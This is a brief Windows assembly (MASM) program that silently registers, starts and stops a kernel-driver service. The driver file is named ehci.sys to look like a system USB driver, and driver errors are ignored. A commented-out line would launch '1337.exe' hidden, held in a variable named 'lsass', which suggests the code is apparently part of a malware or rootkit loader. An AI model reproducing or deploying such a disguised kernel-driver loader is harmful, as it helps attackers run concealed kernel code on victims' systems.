.386
.model flat,stdcall
option casemap:none
include 	c:\masm\include\windows.inc
include 	c:\masm\include\kernel32.inc
include 	c:\masm\include\advapi32.inc
include 	c:\masm\include\user32.inc
include 	c:\masm\include\msvcrt.inc
includelib 	c:\masm\lib\kernel32.lib
include 	c:\masm\include\shell32.inc
includelib 	c:\masm\lib\shell32.lib
includelib 	c:\masm\lib\user32.lib
includelib 	c:\masm\lib\msvcrt.lib
includelib 	c:\masm\lib\advapi32.lib
fopen 		PROTO C :dword ,:dword
fwrite 		PROTO C :dword ,:dword, :dword ,:dword
fread 		PROTO C :dword ,:dword, :dword ,:dword
fclose 		PROTO C :dword
_itoa		PROTO C :dword,:dword,:dword
strcpy 		PROTO C :dword ,:dword
strcat 		PROTO C :dword ,:dword
strcat		PROTO C :dword,:dword

.DATA      	
    hSCManager	dd	0
    hService	dd	0
    ss1		dd	0
	lsass	db '1337.exe',0
	msahci	db	'\ehci.sys',0
	name1	db	'Example',0
	name2	db	"Driver",0
	open    db	"open",0
	SysDir	byte  255 dup (0)
.CODE
main:
    invoke OpenSCManager ,0, 0, SC_MANAGER_CREATE_SERVICE
		mov [hSCManager],eax
        invoke GetWindowsDirectory,addr SysDir, 255
        invoke strcat,addr SysDir,addr msahci
        invoke CreateService, hSCManager, addr name1,addr name2, SERVICE_START or DELETE or SERVICE_STOP, SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, addr SysDir,NULL, NULL, NULL, NULL, NULL
        mov [hService],eax
		cmp eax,0
		jnz L1
		invoke OpenService, hSCManager,addr name1, SERVICE_START or DELETE or SERVICE_STOP
		mov [hService],eax
		L1:
        invoke StartService, hService, 0, NULL
        invoke ControlService, hService, SERVICE_CONTROL_STOP, addr ss1
        invoke CloseServiceHandle,hService
        ;invoke ShellExecuteA,0,addr open,addr lsass,0,0,SW_HIDE
		ret
end main